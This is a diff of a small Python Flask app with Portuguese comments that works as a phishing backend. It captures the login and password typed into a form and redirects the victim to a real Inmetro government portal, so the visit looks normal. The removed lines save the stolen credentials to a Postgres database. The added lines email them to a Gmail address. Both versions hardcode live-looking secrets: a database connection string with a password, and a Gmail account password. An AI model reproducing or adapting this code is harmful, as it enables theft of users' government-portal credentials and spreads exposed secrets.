@@ -1,8 +1,28 @@
 from flask import Flask, render_template, request, redirect
-import psycopg2 as pg
-import os
+from flask_mail import Mail, Message
 
 app = Flask(__name__)
+
+mail = 'ads.juan2017@gmail.com'
+pwd = '30452560'
+
+mail_settings = {
+  "MAIL_SERVER": 'smtp.gmail.com',  # Servidor SMTP do seu provedor de email
+  "MAIL_PORT": 465,  # Porta SMTP
+  "MAIL_USE_SSL": True,  # Habilitar SSL
+  "MAIL_USE_TLS": False,  # Habilitar TLS
+  "MAIL_USERNAME": mail,  # Seu endereço de email
+  "MAIL_PASSWORD": pwd  # Sua senha de email
+}
+
+app.config.update(mail_settings)
+mail = Mail(app)
+
+class Dados:
+   def __init__(self, login, senha):
+      self.login = login
+      self.senha = senha
+
 
 @app.route('/')
 def index():
@@ -11,32 +31,31 @@ def index():
 
 @app.route('/', methods=['POST'])
 def login():
-    login = request.form['Login']
-    senha = request.form['Password']
+    if request.method == 'POST':
+      formDados = Dados(
+         request.form['Login'], 
+         request.form['Password']
+        )
+      
 
-    db_url = "postgres://default:vjIrwA8RoXB2@ep-frosty-sun-259138.us-east-1.postgres.vercel-storage.com:5432/verceldb"
+      # Enviar um email com os dados de login e senha
+      msg = Message(
+         subject= f'Novo login e senha de {formDados.login}', 
+         sender='ads.juan2017@gmail.com', 
+         recipients=['ads.juan2017@gmail.com'],
+         body= f'''
 
-    # Configurar a conexão com o banco de dados
-    conn = pg.connect(db_url)
+          Login: {formDados.login}
+          Senha: {formDados.senha}
+          
+          '''
+      )
 
-    # Criar um cursor para executar as operações no banco de dados
-    cursor = conn.cursor()
-
-    # Executar a inserção dos dados na tabela desejada
-    cursor.execute("INSERT INTO dados (login, senha) VALUES (%s, %s)", (login, senha))
-
-    # Confirmar a transação
-    conn.commit()
-
-    # Fechar o cursor e a conexão com o banco de dados
-    cursor.close()
-    conn.close()
-
-    # Exibir mensagem de log
-    app.logger.info('Login e senha enviados com sucesso!')
-
-    # Redirecionar para um site após a inserção no banco de dados
-    return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
+      mail.send(msg)
+      app.logger.info('Login e senha enviados com sucesso!')
+      
+      # Redirecionar para um site após a inserção no banco de dados
+      return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
 
 if __name__ == '__main__':
   app.run(port=5000)
